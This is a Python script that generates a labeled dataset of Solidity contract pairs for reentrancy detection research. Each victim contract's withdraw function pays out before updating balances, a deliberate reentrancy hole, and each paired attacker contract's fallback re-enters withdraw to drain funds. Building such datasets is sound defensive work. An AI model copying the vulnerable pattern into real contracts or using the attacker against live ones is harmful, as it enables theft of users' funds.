"""Generate cross-contract reentrancy pairs (victim + attacker) for E3.

Outputs (all labeled reentrancy-positive; the victim carries the bug):
  data/injected/victim/victim_N.sol  -- victim contract only (single-contract graph)
  data/injected/pair/pair_N.sol      -- victim + attacker in one file (cross-contract graph)
"""
import os
import sys

OUT_DIR = os.path.normpath(os.path.join(os.path.dirname(__file__), "..", "data", "injected"))


def victim_contract(n):
    return (
        f"contract Victim{n} {{\n"
        "    mapping(address => uint256) public balances;\n"
        "    function deposit() public payable { balances[msg.sender] += msg.value; }\n"
        "    function withdraw(uint256 amount) public {\n"
        "        require(balances[msg.sender] >= amount);\n"
        "        msg.sender.call.value(amount)();\n"
        "        balances[msg.sender] -= amount;\n"
        "    }\n"
        "}\n"
    )


def attacker_contract(n):
    return (
        f"contract Attacker{n} {{\n"
        f"    Victim{n} public victim;\n"
        "    uint256 public count;\n"
        f"    function Attacker{n}(Victim{n} _v) public {{ victim = _v; }}\n"
        "    function attack() public payable {\n"
        "        victim.deposit.value(msg.value)();\n"
        "        victim.withdraw(msg.value);\n"
        "    }\n"
        "    function () public payable {\n"
        "        if (count < 5) { count += 1; victim.withdraw(1); }\n"
        "    }\n"
        "}\n"
    )


def main(n=40):
    vdir = os.path.join(OUT_DIR, "victim")
    pdir = os.path.join(OUT_DIR, "pair")
    os.makedirs(vdir, exist_ok=True)
    os.makedirs(pdir, exist_ok=True)
    for i in range(n):
        with open(os.path.join(vdir, f"victim_{i}.sol"), "w") as f:
            f.write("pragma solidity ^0.4.24;\n" + victim_contract(i))
        with open(os.path.join(pdir, f"pair_{i}.sol"), "w") as f:
            f.write("pragma solidity ^0.4.24;\n" + victim_contract(i) + "\n" + attacker_contract(i))
    print(f"generated {n} pairs in {OUT_DIR}")


if __name__ == "__main__":
    main(int(sys.argv[1]) if len(sys.argv) > 1 else 40)
